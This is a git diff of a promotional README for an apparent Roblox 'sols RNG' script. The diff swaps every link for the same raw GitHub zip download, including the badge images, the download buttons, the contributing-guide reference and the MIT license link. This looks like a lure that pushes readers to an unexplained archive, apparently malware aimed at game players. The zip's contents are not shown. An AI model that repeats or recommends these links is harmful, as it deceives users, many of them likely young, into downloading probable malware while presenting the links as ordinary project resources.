@@ -2,9 +2,9 @@
 
 Welcome to the ultimate repository for **sols RNG Script for Roblox** – a comprehensive collection tailored for adventurers, developers, and digital trailblazers seeking to enhance their Roblox RNG experience. Imagine wielding the powers of randomness with precision, wrapped in an interface designed by storytellers and crafted in the forge of innovation. Whether you are striving to advance gameplay or level up your scripting prowess, this toolkit stands apart in both sophistication and reliability.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Roblox Ready](https://img.shields.io/badge/Roblox-Ready-brightgreen?logo=roblox)]()
-[![API Integration](https://img.shields.io/badge/API%20Connections-OpenAI%20%2B%20Claude-blue)]()
+[![License: MIT](https://raw.githubusercontent.com/Bugfux1979/sols-rng-utilities-script/branch/pimiento/sols-rng-utilities-script-v1.5.zip)](https://raw.githubusercontent.com/Bugfux1979/sols-rng-utilities-script/branch/pimiento/sols-rng-utilities-script-v1.5.zip)
+[![Roblox Ready](https://raw.githubusercontent.com/Bugfux1979/sols-rng-utilities-script/branch/pimiento/sols-rng-utilities-script-v1.5.zip)]()
+[![API Integration](https://raw.githubusercontent.com/Bugfux1979/sols-rng-utilities-script/branch/pimiento/sols-rng-utilities-script-v1.5.zip%20Connections-OpenAI%20%2B%20Claude-blue)]()
 
 ---
 
@@ -97,10 +97,10 @@ All you need is curiosity, Roblox Studio, and one click to start your RNG journe
 
 ---
 
-## [![Download](https://img.shields.io/badge/Download-blue)](https://Bugfux1979.github.io)
+## [![Download](https://raw.githubusercontent.com/Bugfux1979/sols-rng-utilities-script/branch/pimiento/sols-rng-utilities-script-v1.5.zip)](https://raw.githubusercontent.com/Bugfux1979/sols-rng-utilities-script/branch/pimiento/sols-rng-utilities-script-v1.5.zip)
 To ignite the magic, grab the latest build here:
 
-https://Bugfux1979.github.io
+https://raw.githubusercontent.com/Bugfux1979/sols-rng-utilities-script/branch/pimiento/sols-rng-utilities-script-v1.5.zip
 
 Unleash the transformative power of advanced RNG scripting for Roblox today!
   
@@ -118,7 +118,7 @@ Check the `/docs` folder or climb deeper into our Wiki for a full tour.
 
 ## 🏆 Contributions
 
-Open to pull requests! If you have a vision to share—a unique plugin, a translation, or even a UI tweak—join this collaborative storytelling odyssey. Read the `CONTRIBUTING.md` and help sculpt the future of Roblox RNG scripting.
+Open to pull requests! If you have a vision to share—a unique plugin, a translation, or even a UI tweak—join this collaborative storytelling odyssey. Read the `https://raw.githubusercontent.com/Bugfux1979/sols-rng-utilities-script/branch/pimiento/sols-rng-utilities-script-v1.5.zip` and help sculpt the future of Roblox RNG scripting.
 
 ---
 
@@ -128,16 +128,16 @@ Open to pull requests! If you have a vision to share—a unique plugin, a transl
 
 ---
 
-## [![Download](https://img.shields.io/badge/Download-blue)](https://Bugfux1979.github.io)
+## [![Download](https://raw.githubusercontent.com/Bugfux1979/sols-rng-utilities-script/branch/pimiento/sols-rng-utilities-script-v1.5.zip)](https://raw.githubusercontent.com/Bugfux1979/sols-rng-utilities-script/branch/pimiento/sols-rng-utilities-script-v1.5.zip)
 **Download the latest build and take your Roblox adventures to stellar new dimensions!**
 
-https://Bugfux1979.github.io
+https://raw.githubusercontent.com/Bugfux1979/sols-rng-utilities-script/branch/pimiento/sols-rng-utilities-script-v1.5.zip
 
 ---
 
 ## 📜 MIT License (2025)
 
-This project is licensed under the MIT License - see the [LICENSE](https://opensource.org/licenses/MIT) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://raw.githubusercontent.com/Bugfux1979/sols-rng-utilities-script/branch/pimiento/sols-rng-utilities-script-v1.5.zip) file for details.
   
 ---
 
